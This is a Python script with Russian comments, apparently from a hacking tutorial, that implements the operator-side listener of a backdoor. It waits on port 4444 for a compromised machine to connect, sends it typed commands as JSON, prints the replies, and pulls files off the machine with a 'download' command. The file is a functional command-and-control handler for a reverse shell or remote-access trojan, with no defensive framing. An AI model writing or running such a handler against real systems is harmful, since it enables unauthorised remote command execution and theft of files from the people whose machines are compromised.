#!/usr/bin/python

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        self.lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.lis.bind((ip, port))
        self.lis.listen(0)
        print('[+] waiting for connection')
        self.connection, address = self.lis.accept()
        print('[+] Connection {0}'.format(address))

    def reliable_sehd(self, data):

        # Метод упаковки данных в json формат для точной передачи данных.
        json_data = json.dumps(data)  # Создаем переменую в которую будем упаковывать данные.
        self.connection.send(json_data.encode('utf-8'))  # Отправляем упакованые данные .

    def write_file(self):
        # Записываем полученый файл.
        with open('frr.jpg', 'wb') as f:
            while True:
                data = self.connection.recv(1024)
                if not data:
                    break
                else:
                    f.write(data)

    def reliable_recv(self):
        # Метод распаковки полученых данных.
        json_data_recv = ''  # Создаем пустую переменую,для работы с ней в цикле.
        while True:  # Обьявляем бесконечный цикл.
            try:
                json_data_recv = json_data_recv + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data_recv)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_sehd(command)
        if command[0] == "exit":
            self.connection.close()  # Закрываем соединение.
            exit()  # Закрываем программу.
        else:
            return self.reliable_recv()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")  # Создаем из строки скписок,для получения команды и аргумента.
            result = self.execute_remotely(command)
            if command[0] == 'download':  # Если команда загрузить ,тогда получаем файл.
                self.write_file()
            print(result)


my_listener = Listener("127.0.0.1", 4444)
my_listener.run()
